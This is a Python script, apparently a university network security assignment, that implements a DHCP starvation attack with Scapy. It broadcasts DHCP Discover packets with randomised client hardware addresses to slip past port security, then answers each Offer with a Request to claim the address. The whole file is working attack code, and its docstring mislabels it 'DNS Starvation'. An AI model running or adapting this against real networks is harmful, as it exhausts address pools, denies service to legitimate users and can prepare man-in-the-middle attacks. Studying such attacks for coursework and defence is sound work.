"""
Python Version 3.8

Singapore Institute of Technology (SIT)
Information and Communications Technology (Information Security), BEng (Hons)

ICT-2203 Network Security Assignment 1

Author: @ Tan Zhao Yea / 1802992
Academic Year: 2020/2021
Lecturer: Dr. Woo Wing Keong
Submission Date: 25th October 2020

This script holds the code to perform DNS Starvation.
	> Port Security enabled discourage us to use RandMac() from the same host
	> Layer 2 src remains the same, but chaddr at Layer 7 is change to use a RandMac()
	> First, perform DHCP Discover Packet
	> Then, perform DHCP Request Packet after receiving the DHCP Offer Packet
"""

import multiprocessing as mp
from scapy.all import *

# UDP Port Number Protocol
SERVER_DHCP_PORT = 67
CLIENT_DHCP_PORT = 68

# Default Configurations
IFACE = conf.iface
BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'
META_ADDR = "0.0.0.0"
BROADCAST_IP = "255.255.255.255"
HW = get_if_hwaddr(IFACE)

# DHPC Options
MSG_TYPE = 0
SERVER_ID = 1
DHCP_OFFER = 2
ANS = 1

# Sleep Time
SLEEP_DURATION = 2


class DHCPStarvation(object):
    def __init__(self, iface, hardware_addr, broadcast_mac, meta_addr, broadcast_ip, random_mac):
        self.iface = iface
        self.broadcast_mac = broadcast_mac
        self.meta_address = meta_addr
        self.broadcast_ip = broadcast_ip

        # Get HW Address
        self.hw = hardware_addr
        self.rand_mac = random_mac

    def send_dhcp_dis_pkt(self):
        """ Creates the DHCP Discover Packet to prepare for DHCP Starvation """
        pkt = Ether(src=self.hw, dst=self.broadcast_mac) \
              / IP(src=self.meta_address, dst=self.broadcast_ip) \
              / UDP(sport=CLIENT_DHCP_PORT, dport=SERVER_DHCP_PORT) \
              / BOOTP(chaddr=self.rand_mac) \
              / DHCP(options=[('message-type', 'discover'), 'end'])

        sendp(pkt, iface=self.iface, verbose=0)


def craft_dhcp_pkt():
    """ Crafting DHCP Discover Packet Starvation Attack """
    for i in range(20):
        print("[*] Crafting DHCP Discover Packet")
        random_mac = RandMAC()
        packet = DHCPStarvation(iface=IFACE,
                                hardware_addr=HW,
                                broadcast_mac=BROADCAST_MAC,
                                meta_addr=META_ADDR,
                                broadcast_ip=BROADCAST_IP,
                                random_mac=random_mac)

        print("[*] Sending DHCP Discover Packet ...")
        packet.send_dhcp_dis_pkt()
        print(f"[*] Sleeping for {SLEEP_DURATION} seconds ...")
        time.sleep(SLEEP_DURATION)


def dhcp_pkt_filter(pkt):
    """
    Allow only DHCP Packet for processing
    :param pkt: Incoming Packet
    :return: Boolean (True/False)
    """
    try:
        if pkt.haslayer(DHCP) and pkt[DHCP].options[MSG_TYPE][ANS] == DHCP_OFFER:
            return pkt[UDP].sport == SERVER_DHCP_PORT and pkt[UDP].dport == CLIENT_DHCP_PORT

        return False

    except:
        pass


def send_dhcp_req(pkt):
    """
    Sending DHCP Request Packet
    :param pkt: Incoming Offer Packet
    """
    dhcp_request = Ether(src=HW, dst=pkt[Ether].src) \
                    / IP(src=META_ADDR, dst=BROADCAST_IP) \
                    / UDP(sport=CLIENT_DHCP_PORT, dport=SERVER_DHCP_PORT) \
                    / BOOTP(chaddr=pkt[BOOTP].chaddr) \
                    / DHCP(options=[('message-type', 'request'), ('server_id', pkt[DHCP].options[SERVER_ID][ANS]), ('requested_addr', pkt[BOOTP].yiaddr),'end'])

    sendp(dhcp_request, iface=IFACE, verbose=0)
    print(f"[*] Successfully Starved Address: {pkt[BOOTP].yiaddr}")


def main():
    """ Sniffer Function """
    sniff(lfilter=dhcp_pkt_filter, prn=send_dhcp_req, iface=IFACE)


if __name__ == '__main__':
    p1 = mp.Process(target=main)
    p2 = mp.Process(target=craft_dhcp_pkt)
    print("[*] Starting Program ...")
    p1.start()
    p2.start()

